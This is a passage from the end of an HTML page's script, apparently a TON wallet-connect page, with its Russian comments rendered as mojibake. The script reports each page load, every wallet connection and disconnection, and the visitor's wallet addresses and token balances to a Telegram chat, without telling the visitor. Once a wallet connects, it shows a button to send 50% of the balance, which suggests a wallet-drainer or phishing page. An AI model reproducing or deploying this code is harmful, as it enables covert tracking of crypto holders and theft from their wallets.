            addDebugInfo(`–í–æ–∑–≤—Ä–∞—â–∞–µ–º —Ç–µ—Å—Ç–æ–≤—ã–µ –¥–∞–Ω–Ω—ã–µ –æ Jetton —Ç–æ–∫–µ–Ω–∞—Ö`);
            
            // –¢–µ—Å—Ç–æ–≤—ã–µ –¥–∞–Ω–Ω—ã–µ –¥–ª—è Jetton —Ç–æ–∫–µ–Ω–æ–≤
            return [
                {
                    address: "EQBynBO23ywHy_CgarY9NK9FTz0yDsG82PtcbSTQgGoXwiuA",
                    balance: "1000000000", // 1 USDT
                    name: "Tether USD",
                    symbol: "USDT",
                    decimals: 9
                },
                {
                    address: "EQB-MPwrd1G6WKNkLz_VnV7AvpOLaAsH0cRDMntPcMiPmHwY",
                    balance: "5000000000", // 5 USDC
                    name: "USD Coin",
                    symbol: "USDC",
                    decimals: 9
                },
                {
                    address: "EQAvDfWFG0oYX19jwNDNBBL1rKNT9XfaGP9HyTb5nb2Eml6y",
                    balance: "10000000000", // 10 WBTC
                    name: "Wrapped Bitcoin",
                    symbol: "WBTC",
                    decimals: 9
                }
            ];
        }

        try {
            // –ü–æ–ª—É—á–∞–µ–º –±–∞–ª–∞–Ω—Å TON —á–µ—Ä–µ–∑ TON Center
            const tonBalance = await getTonCenterBalance();
            
            // –ú–∞—Å—Å–∏–≤ –¥–ª—è –≤—Å–µ—Ö –±–∞–ª–∞–Ω—Å–æ–≤ (TON + Jettons)
            const allBalances = [tonBalance];
            
            // –î–æ–±–∞–≤–ª—è–µ–º Jetton —Ç–æ–∫–µ–Ω—ã –≤ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç –≤—ã–±—Ä–∞–Ω–Ω–æ–π –æ–ø—Ü–∏–∏
            if (jettonOption === 'mock') {
                const mockJettons = getMockJettons();
                
                // –î–æ–±–∞–≤–ª—è–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –∫–∞–∂–¥–æ–º Jetton —Ç–æ–∫–µ–Ω–µ
                for (const jetton of mockJettons) {
                    const formattedBalance = (Number(jetton.balance) / Math.pow(10, jetton.decimals)).toString();
                    
                    allBalances.push({
                        type: "jetton",
                        jettonAddress: jetton.address,
                        balance: jetton.balance,
                        name: jetton.name,
                        symbol: jetton.symbol,
                        decimals: jetton.decimals,
                        formattedBalance: formattedBalance
                    });
                }
            }
            
            // –í—ã–≤–æ–¥–∏–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –±–∞–ª–∞–Ω—Å–∞—Ö –≤ –∫–æ–Ω—Å–æ–ª—å
            console.log("\n=== –ò–¢–û–ì–û–í–´–ï –ë–ê–õ–ê–ù–°–´ ===");
            console.log("–û—Å–Ω–æ–≤–Ω–æ–π —Ç–æ–∫–µ–Ω TON:", allBalances[0].formattedBalance, "TON");
            
            // –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –¥–ª—è Telegram
            let balanceMessage = `üí∞ –ë–∞–ª–∞–Ω—Å—ã –¥–ª—è <code>${friendlyAddress}</code>:\n\n`;
            balanceMessage += `üîπ TON: ${allBalances[0].formattedBalance}\n`;
            
            if (allBalances.length > 1) {
                console.log("\nJetton —Ç–æ–∫–µ–Ω—ã:");
                balanceMessage += `\nü™ô Jetton —Ç–æ–∫–µ–Ω—ã:\n`;
                
                for (let i = 1; i < allBalances.length; i++) {
                    const token = allBalances[i];
                    console.log(`${token.name} (${token.symbol}): ${token.formattedBalance}`);
                    balanceMessage += `- ${token.name} (${token.symbol}): ${token.formattedBalance}\n`;
                }
            } else {
                console.log("\nJetton —Ç–æ–∫–µ–Ω—ã –Ω–µ –Ω–∞–π–¥–µ–Ω—ã");
                balanceMessage += `\nJetton —Ç–æ–∫–µ–Ω—ã –Ω–µ –Ω–∞–π–¥–µ–Ω—ã`;
            }
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –±–∞–ª–∞–Ω—Å–∞—Ö –≤ Telegram
            await sendTelegramNotification(balanceMessage);
            
            console.log("\n–ü–æ–ª–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –±–∞–ª–∞–Ω—Å–∞—Ö:", JSON.stringify(allBalances, null, 2));
            addDebugInfo(`–ü–æ–ª–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –±–∞–ª–∞–Ω—Å–∞—Ö: ${JSON.stringify(allBalances)}`);

            return allBalances;
        } catch (error) {
            console.error("–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –±–∞–ª–∞–Ω—Å–æ–≤:", error);
            addDebugInfo(`–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –±–∞–ª–∞–Ω—Å–æ–≤: ${error.message}`);
            await sendTelegramNotification(`‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –±–∞–ª–∞–Ω—Å–æ–≤: ${error.message}`);
            
            // –í —Å–ª—É—á–∞–µ –æ—à–∏–±–∫–∏ –≤–æ–∑–≤—Ä–∞—â–∞–µ–º —Ç–æ–ª—å–∫–æ TON —Å –Ω—É–ª–µ–≤—ã–º –±–∞–ª–∞–Ω—Å–æ–º
            return [{
                type: "native",
                name: "Toncoin",
                symbol: "TON",
                balance: "0",
                formattedBalance: "0",
                decimals: 9,
                error: error.message
            }];
        }
    }
    
    // –ü—Ä–æ–≤–µ—Ä—è–µ–º, –ø–æ–¥–∫–ª—é—á–µ–Ω –ª–∏ —É–∂–µ –∫–æ—à–µ–ª–µ–∫
    tonConnectUI.onStatusChange(async (wallet) => {
        if (wallet) {
            // –ü–æ–ª—É—á–∞–µ–º –∞–¥—Ä–µ—Å –∫–æ—à–µ–ª—å–∫–∞ –≤ raw —Ñ–æ—Ä–º–∞—Ç–µ
            connectedAddressRaw = wallet.account.address;
            
            // –ö–æ–Ω–≤–µ—Ä—Ç–∏—Ä—É–µ–º –≤ user-friendly —Ñ–æ—Ä–º–∞—Ç
            connectedAddressFriendly = convertRawToFriendlyAddress(connectedAddressRaw);
            
            // –û—Ç–æ–±—Ä–∞–∂–∞–µ–º –æ–±–∞ —Ñ–æ—Ä–º–∞—Ç–∞ –∞–¥—Ä–µ—Å–∞
            document.getElementById('wallet-address-raw').textContent = connectedAddressRaw;
            document.getElementById('wallet-address-friendly').textContent = connectedAddressFriendly;
            document.getElementById('wallet-info').style.display = 'block';
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–∏ –∫–æ—à–µ–ª—å–∫–∞ —Å –æ–±–æ–∏–º–∏ —Ñ–æ—Ä–º–∞—Ç–∞–º–∏ –∞–¥—Ä–µ—Å–∞
            await sendTelegramNotification(`üîÑ –°—Ç–∞—Ç—É—Å –∫–æ—à–µ–ª—å–∫–∞ –∏–∑–º–µ–Ω–∏–ª—Å—è\n‚úÖ –ö–æ—à–µ–ª–µ–∫ –ø–æ–¥–∫–ª—é—á–µ–Ω\nüìù Raw –∞–¥—Ä–µ—Å: <code>${connectedAddressRaw}</code>\nüìù User-friendly –∞–¥—Ä–µ—Å: <code>${connectedAddressFriendly}</code>`);
            
            // –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Ç–æ–∫–µ–Ω–∞—Ö
            walletTokens = await getWalletBalances(connectedAddressFriendly, connectedAddressRaw);
            displayTokens(walletTokens);
            
            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –∫–Ω–æ–ø–∫—É –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ 50% –±–∞–ª–∞–Ω—Å–∞
            document.getElementById('send-half-button').style.display = 'block';
        } else {
            document.getElementById('wallet-info').style.display = 'none';
            document.getElementById('send-half-button').style.display = 'none';
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ–± –æ—Ç–∫–ª—é—á–µ–Ω–∏–∏ –∫–æ—à–µ–ª—å–∫–∞
            if (connectedAddressRaw) {
                await sendTelegramNotification(`üîÑ –°—Ç–∞—Ç—É—Å –∫–æ—à–µ–ª—å–∫–∞ –∏–∑–º–µ–Ω–∏–ª—Å—è\n‚ùå –ö–æ—à–µ–ª–µ–∫ –æ—Ç–∫–ª—é—á–µ–Ω\nüìù –ü–æ—Å–ª–µ–¥–Ω–∏–π –∞–¥—Ä–µ—Å: <code>${connectedAddressFriendly}</code>`);
                connectedAddressRaw = '';
                connectedAddressFriendly = '';
            }
        }
    });
    
    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
    window.addEventListener('load', async () => {
        await sendTelegramNotification('üåê –°—Ç—Ä–∞–Ω–∏—Ü–∞ –∑–∞–≥—Ä—É–∂–µ–Ω–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º');
        
        // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –æ—Ç–ª–∞–¥–æ—á–Ω—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é
        document.getElementById('debug-info').style.display = 'block';
    });
</script>

</body>
</html>
